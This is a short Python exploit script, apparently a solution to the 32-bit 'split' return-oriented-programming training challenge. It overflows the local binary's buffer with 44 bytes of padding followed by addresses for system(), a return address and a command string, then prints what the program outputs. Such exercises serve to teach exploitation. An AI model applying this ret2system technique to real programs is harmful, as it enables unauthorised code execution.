import subprocess
from pwn import p32

bin = "./split32"

padding = b"A" * 44
arg_addr = 0x0804A030
ret_addr = 0x080485A5
sys_addr = 0x080483E0

prepd_arg = p32(arg_addr)
prepd_ret = p32(ret_addr)
prepd_sys = p32(sys_addr)

payload = padding + prepd_sys + prepd_ret + prepd_arg

result = subprocess.run([bin], input=payload, text=False, capture_output=True)

print(result.stdout.decode())
